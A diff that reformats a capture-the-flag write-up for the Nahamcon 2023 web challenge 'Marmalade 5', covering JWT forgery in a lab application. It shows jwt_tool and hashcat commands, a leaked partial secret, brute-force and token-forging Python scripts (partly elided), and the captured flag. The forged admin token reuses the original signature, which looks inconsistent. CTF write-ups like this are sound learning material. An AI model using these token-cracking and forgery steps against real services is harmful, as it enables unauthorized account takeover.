@@ -1,31 +1,49 @@
 ---
-CTF: Nahamcon 2023
-Challenge Name: Marmalade 5
-Category: Web
-Date: 15/06/23
-Author: congon4tor
-Points: 322
-Solves: 191
+name: Marmalade 5 (2023)
+event: Nahamcon CTF 2023
+category: Web
+description: Writeup for Marmalade 5 (Web) - Nahamcon CTF (2023) 💜
+layout:
+    title:
+        visible: true
+    description:
+        visible: true
+    tableOfContents:
+        visible: false
+    outline:
+        visible: true
+    pagination:
+        visible: true
 ---
-[![Nahamcon CTF 2023: Marmalade 5 (Web)](https://img.youtube.com/vi/3LRZsnSyDrQ/0.jpg)](https://www.youtube.com/watch?v=3LRZsnSyDrQ "Nahamcon CTF 2023: Marmalade 5 (Web)")
 
-### Description
->Enjoy some of our delicious home made marmalade!
+# Marmalade 5
+
+## Video Walkthrough
+
+[![VIDEO](https://img.youtube.com/vi/3LRZsnSyDrQ/0.jpg)](https://www.youtube.com/watch?v=3LRZsnSyDrQ "Nahamcon CTF 2023: Marmalade 5 (Web)")
+
+## Description
+
+> Enjoy some of our delicious home made marmalade!
 
 ## Recon
+
 Can't register as `admin`.
+
 ```bash
-Login as the admin has been disabled 
+Login as the admin has been disabled
 ```
 
 Register as `cat` and it says only `admin` can get flag!
 
-Check the [JWT](https://youtu.be/GIq3naOLrTg) in session cookies. 
+Check the [JWT](https://youtu.be/GIq3naOLrTg) in session cookies.
+
 ```json
 eyJhbGciOiJNRDVfSE1BQyJ9.eyJ1c2VybmFtZSI6ImNhdCJ9.C3Z8QcoVXXFa-LAzFZbZ1w
 ```
 
 Decode it with [jwt.io](https://jwt.io)
+
 ```json
 {
   "alg": "MD5_HMAC"
@@ -36,12 +54,15 @@ Decode it with [jwt.io](https://jwt.io)
 ```
 
 ## First attempts
+
 Tried `null` and `none` algorithm attacks with `jwt_tool`.
+
 ```bash
 jwt_tool eyJhbGciOiJNRDVfSE1BQyJ9.eyJ1c2VybmFtZSI6ImNhdCJ9.C3Z8QcoVXXFa-LAzFZbZ1w -X a -pc username -pv admin
 ```
 
 When trying to use the tokens, get an error.
+
 ```bash
 Invalid algorithm, we only accept tokens signed with our MD5_HMAC algorithm using the secret fsrwjcfszeg*****
 ```
@@ -49,6 +70,7 @@ Invalid algorithm, we only accept tokens signed with our MD5_HMAC algorithm usin
 So we know the first 11 characters of the key `fsrwjcfszeg`, let's try to brute force the last 5.
 
 Tried `jwt_tool` but it doesn't work with the `MD5_HMAC` algorithm.
+
 ```bash
 jwt_tool eyJhbGciOiJNRDVfSE1BQyJ9.eyJ1c2VybmFtZSI6ImNhdCJ9.C3Z8QcoVXXFa-LAzFZbZ1w -C -p fsrwjcfszeg*****
 
@@ -56,6 +78,7 @@ Algorithm is not HMAC-SHA - cannot test with this tool.
 ```
 
 Same goes for `hashcat`.
+
 ```bash
 hashcat -a 3 -m 16500 'eyJhbGciOiJNRDVfSE1BQyJ9.eyJ1c2VybmFtZSI6ImNhdCJ9.C3Z8QcoVXXFa-LAzFZbZ1w' fsrwjcfszeg?l?l?l?l?l
 
@@ -64,7 +87,9 @@ No hashes loaded.
 ```
 
 ## Solve script #1 (brute-force)
-Let's (me and chatGPT) make a custom script to crack the signature. 
+
+Let's (me and chatGPT) make a custom script to crack the signature.
+
 ```python
 import jwt
 import hashlib
@@ -113,12 +138,15 @@ for i in range(len(charset) ** key_length):
 ```
 
 Got the key!
+
 ```bash
 Key: fsrwjcfszegvsyfa
 ```
 
 ## Solve script #2 (forge token)
+
 Now another custom script to forge a token with user `admin`.
+
 ```python
 import jwt
 import hashlib
@@ -166,11 +194,11 @@ print("Modified Token:", modified_jwt)
 ```
 
 Receive a new token, signed with `MD5_HMAC` using the secret key `fsrwjcfszegvsyfa`.
+
 ```bash
 eyJhbGciOiJNRDVfSE1BQyJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.C3Z8QcoVXXFa-LAzFZbZ1w
 ```
 
 We replace the cookie and receive a flag!
-```txt
-flag{a249dff54655158c25ddd3584e295c3b}
-```
+
+Flag: `flag{a249dff54655158c25ddd3584e295c3b}`
